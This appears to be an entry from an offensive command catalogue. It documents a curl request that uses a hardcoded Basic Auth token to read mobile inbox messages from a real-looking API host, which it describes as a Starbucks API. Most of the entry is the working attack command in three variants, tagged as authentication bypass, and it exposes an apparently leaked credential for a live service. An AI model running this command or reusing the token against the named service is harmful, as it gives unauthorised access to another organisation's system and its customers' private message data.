---
id: cmd-get-mobileinbox
data: >-
  curl -k -H "Authorization: Basic QVBSTlhXTFpUUTo4NGY0NDlmMWYzOWEyMDUz"
  https://crmproxy.protel.com.tr/api/v1/MobileInbox/Limit/20
tags:
  - api-query
  - auth-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:20.530Z'
verified: false
validated: true
submitted: true
---
# get-mobileinbox-limit

## Command

```bash
curl -k -H "Authorization: Basic QVBSTlhXTFpUUTo4NGY0NDlmMWYzOWEyMDUz" https://crmproxy.protel.com.tr/api/v1/MobileInbox/Limit/20
```

## Description

This curl command fetches up to 20 inbox messages from the Starbucks API using the static Basic Auth token, demonstrating bypass of app authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Ignore SSL certificate validation (for testing) | Yes |
| `-H "Authorization: ..."` | Static Basic Auth token | Yes |
| `/Limit/20` | Path parameter to limit results to 20 items | No (default may vary) |

## Examples

### Basic Usage

```bash
curl -k -H "Authorization: Basic QVBSTlhXTFpUUTo4NGY0NDlmMWYzOWEyMDUz" https://crmproxy.protel.com.tr/api/v1/MobileInbox/Limit/20
```

### Advanced Usage

```bash
curl -k -H "Authorization: Basic QVBSTlhXTFpUUTo4NGY0NDlmMWYzOWEyMDUz" -H "Accept: application/json" https://crmproxy.protel.com.tr/api/v1/MobileInbox/Limit/20
```

## Expected Output

JSON response containing inbox message data, e.g., {"messages": [{...}]} with HTTP 200 status.

## Related

- [[commands/get-customerprofiles]]
- [[procedures/Extract-and-Reuse-Static-Auth-Token]]
